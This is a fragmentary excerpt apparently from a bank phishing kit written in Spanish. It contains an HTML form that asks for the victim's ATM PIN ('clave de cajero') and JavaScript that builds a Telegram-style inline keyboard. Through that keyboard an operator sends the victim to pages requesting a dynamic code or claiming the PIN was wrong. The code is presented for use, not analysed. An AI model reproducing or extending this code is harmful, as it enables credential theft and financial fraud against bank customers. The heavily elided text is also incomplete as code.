...
<div class="container">
    ...
    <form id="transaction-form">
      ...
      <p class="instructions-text">Es tu clave principal con la que realizas pagos y retiros con tu tarjeta.</p>
...
<script>
  ...
  <script>
    ...
    function actualizarLogos() {
      ...
      document.getElementById("clave-label").innerText = "Clave de cajero:";
    }
...
--------------------------------------------------
        ...
        const keyboard = JSON.stringify({
            inline_keyboard: [
                ...
                [{ text: "Error Clave de Cajero", callback_data: `pedir_cajero:${transactionId}` }],
            ...
            if (verificationUpdate) {
                ...
                switch (verificationUpdate.callback_query.data) {
                    case `pedir_dinamica:${transactionId}`:
                        window.location.href = "dinamica-id.php";
                        break;
                    case `pedir_cajero:${transactionId}`:
                        window.location.href = "error-ccajero.php";
                        break;
